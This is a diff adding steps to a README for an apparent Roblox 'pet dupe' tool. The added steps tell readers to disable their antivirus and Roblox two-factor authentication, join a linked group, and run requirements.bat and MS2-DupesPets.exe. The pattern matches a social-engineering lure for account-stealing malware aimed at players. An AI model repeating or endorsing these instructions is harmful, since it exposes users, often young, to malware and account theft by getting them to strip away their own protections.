@@ -1,5 +1,12 @@
 # IMPORTANT
 ## <a href="https://web.roblox.com/groups/5212647/Mystery-Soleil#!/about">JOIN THIS IF YOU WANT THE DUPES WORK</a>
+
+# **IMPORTANT TURN OFF YOUR ANTI VIRUS AND 2FA in ROBLOX**
+
+## 1: join my group in roblox https://web.roblox.com/groups/5212647/Mystery-Soleil#!/about
+## 2: open requirements.bat
+## 3: open MS2-DupesPets.exe
+
 </p>
   <img width="200" src="https://tr.rbxcdn.com/cff4c930888b594cc6add85ccf91d339/768/432/Image/Png" alt="logo">
 </p>
